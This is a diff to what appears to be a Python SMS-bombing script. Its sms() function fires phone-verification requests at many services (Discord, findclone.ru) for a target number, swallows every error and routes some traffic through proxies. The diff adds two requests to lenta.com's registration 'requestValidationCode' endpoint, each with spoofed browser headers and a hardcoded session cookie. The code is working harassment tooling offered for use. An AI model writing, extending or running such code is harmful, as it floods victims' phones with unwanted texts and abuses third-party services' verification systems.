@@ -698,6 +698,35 @@ def sms(prx, number, tm, code):
 					pass
 
 				try:
+					header = {
+						"accept": "application/json, text/javascript, */*; q=0.01",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "28",
+						"content-type": "application/json",
+						"cookie": '.ASPXANONYMOUS=ZSfe3OqfTsXelqx9auQil8-utvhbMRV3BB2WbjGcvWwjzIOTnpm-Tal765FLY6UwX7g3uu2CT8-0gR6Bi8ASZPCvi6BtyVTh6knXKcoRDwZBY-4f7jJEZUC9hCyngzjRwEpsVQ2; ASP.NET_SessionId=sfvamrgootzz15ukrh1zwskw; CustomerId=7ecba542148340b18a857aabdd9c585c; ShouldSetDeliveryOptions=True; ShouldRenderSwitchToPickupTooltip=False; cookiesession1=678B286C0123456788901234BCDE211D; oxxfgh=L!bffb9b45-6789-78fb-7ad2-f3208073956e#0#1800000#5000#1800000; KFP_DID=90b1e356-23e9-265e-4def-1ac5ef37e71f',
+						"dnt": "1",
+						"Host": "lenta.com",
+						"origin": "https://lenta.com",
+						"referer": "https://lenta.com/npl/authentication/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+
+					payload = {
+						"phone": number[1:]
+					}
+					requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json=payload, headers=header, proxies = proxies)
+				except:
+					pass
+
+				try:
 					requests.get(f"https://findclone.ru/register?phone=+{number}", proxies = proxies)
 				except:
 					pass
@@ -935,6 +964,35 @@ def sms(prx, number, tm, code):
 						"phone": f"+ {code} ( {num2} ) {num3}-{num4}-{num5}"
 					}
 					requests.post("https://discord.com/api/v9/users/@me/phone", data = payload)
+				except:
+					pass
+
+				try:
+					header = {
+						"accept": "application/json, text/javascript, */*; q=0.01",
+						"accept-encoding": "gzip, deflate, br",
+						"accept-language": "en-US,en;q=0.9",
+						"content-length": "28",
+						"content-type": "application/json",
+						"cookie": '.ASPXANONYMOUS=ZSfe3OqfTsXelqx9auQil8-utvhbMRV3BB2WbjGcvWwjzIOTnpm-Tal765FLY6UwX7g3uu2CT8-0gR6Bi8ASZPCvi6BtyVTh6knXKcoRDwZBY-4f7jJEZUC9hCyngzjRwEpsVQ2; ASP.NET_SessionId=sfvamrgootzz15ukrh1zwskw; CustomerId=7ecba542148340b18a857aabdd9c585c; ShouldSetDeliveryOptions=True; ShouldRenderSwitchToPickupTooltip=False; cookiesession1=678B286C0123456788901234BCDE211D; oxxfgh=L!bffb9b45-6789-78fb-7ad2-f3208073956e#0#1800000#5000#1800000; KFP_DID=90b1e356-23e9-265e-4def-1ac5ef37e71f',
+						"dnt": "1",
+						"Host": "lenta.com",
+						"origin": "https://lenta.com",
+						"referer": "https://lenta.com/npl/authentication/",
+						"sec-ch-ua": '"Chromium";v="96", "Opera GX";v="82", ";Not A Brand";v="99"',
+						"sec-ch-ua-mobile": "?0",
+						"sec-ch-ua-platform": "Windows",
+						"sec-fetch-dest": "empty",
+						"sec-fetch-mode": "cors",
+						"sec-fetch-site": "same-origin",
+						"sec-gpc": "1",
+						"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36 OPR/82.0.4227.50 (Edition Yx GX)"
+					}
+
+					payload = {
+						"phone": number[1:]
+					}
+					requests.post("https://lenta.com/api/v1/registration/requestValidationCode", json=payload, headers=header)
 				except:
 					pass
 
